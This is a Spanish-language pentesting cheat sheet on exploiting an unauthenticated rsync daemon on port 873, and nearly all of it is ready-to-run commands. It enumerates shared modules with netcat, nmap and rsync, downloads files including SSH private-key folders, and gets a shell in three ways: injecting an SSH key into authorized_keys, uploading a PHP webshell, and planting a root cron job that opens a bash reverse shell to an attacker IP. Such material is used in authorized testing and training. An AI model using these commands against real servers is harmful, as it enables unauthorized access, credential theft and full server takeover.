---
title: Rsync (Remote Sync - Puerto 873)
pubDate: '2026-08-26'
---

## ¿Qué es Rsync?
**Rsync** es una herramienta de sincronización de archivos y directorios muy común en entornos Linux. Cuando corre como un servicio (daemon) en el puerto **873**, permite a otros equipos sincronizar datos de forma eficiente a través de la red.

### Riesgos principales
Si el servicio no requiere contraseña, un atacante puede **listar, descargar y subir archivos** en los directorios compartidos. Esto puede derivar en el robo de información sensible o en el control total del servidor mediante la sobrescritura de archivos críticos.

---

## 🔎 1. Enumeración Inicial

### 1. Identificar el Servicio y Listar Módulos con Netcat / Nmap
```bash
# Conexión manual y envío del comando #list para listar recursos compartidos
nc -nv <TARGET_IP> 873
@RSYNCD: 31.0
#list
dev             Dev Tools
@RSYNCD: EXIT

# Nmap Script para listar módulos
nmap -p 873 --script=rsync-list-modules <TARGET_IP>
```

### 2. Listar Módulos y Contenidos con `rsync`
En Rsync, los directorios compartidos se denominan "módulos":
```bash
# Sintaxis clásica (doble dos puntos ::)
rsync --list-only <TARGET_IP>::
rsync --list-only <TARGET_IP>::modulo

# Sintaxis URI moderna
rsync -av --list-only rsync://<TARGET_IP>/modulo
```

---

## 🚀 2. Vectores de Explotación

### 1. Descarga de Archivos Sensibles
```bash
# Descargar un archivo específico
rsync -av <TARGET_IP>::modulo/ruta/archivo.conf .

# Descargar recursivamente una carpeta completa (ej. .ssh para buscar llaves)
rsync -av <TARGET_IP>::modulo/home/usuario/.ssh/ ./backup_ssh
```

### 2. Obtención de Shell (Escritura Arbitraria)
* **Inyección de Llave SSH:**
  ```bash
  rsync -av ~/.ssh/id_rsa.pub <TARGET_IP>::modulo/home/usuario/.ssh/authorized_keys
  ssh usuario@<TARGET_IP> -i ~/.ssh/id_rsa
  ```
* **WebShell en servidor web:**
  ```bash
  rsync -av shell.php <TARGET_IP>::modulo/var/www/html/shell.php
  ```
* **Tareas Cron (`/etc/cron.d/`):**
  ```bash
  echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'" > shell_cron
  rsync -av shell_cron <TARGET_IP>::modulo/etc/cron.d/shell_cron
  ```

---

## 💡 3. Tips de Uso y Transporte SSH

* **Sintaxis `::` vs `rsync://`:** Ambas conectan directamente al daemon en el puerto 873.
* **Túneles SSH / Puertos no estándar:** Si el daemon de Rsync está configurado para requerir autenticación SSH o corre en un puerto SSH personalizado:
  ```bash
  rsync -av -e ssh usuario@<TARGET_IP>:/ruta/remota ./destino
  rsync -av -e "ssh -p 2222" usuario@<TARGET_IP>:/ruta/remota ./destino
  ```
